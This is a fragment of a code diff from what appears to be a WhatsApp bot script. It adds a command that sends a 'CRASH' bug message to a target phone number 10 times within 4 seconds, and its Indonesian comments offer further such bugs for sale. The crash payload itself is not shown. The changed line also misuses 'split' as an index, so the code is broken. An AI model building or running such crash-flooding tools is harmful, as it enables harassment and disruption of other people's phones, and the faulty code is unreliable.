@@ -1421,7 +1421,7 @@ break
 //CUMAN WORKS DI BAILEYS TERTENTU KALAU MAU GUNAKAN 
 //BUG BARU INI KALIAN BISA ORDER KE GUA YA GUYS YAH
 case '🔥': case '🗿': case 'hajar': {
-mm = [0]+'@s.whatsapp.net'
+mm = text.split[0]+'@s.whatsapp.net'
 jumlah = '10'
 let secon = '4'
 a = await reply(`Succes send bug "CRASH🐼" Ke ${mm} Sebanyak ${jumlah} kali dalam waktu ${secon} detik`)
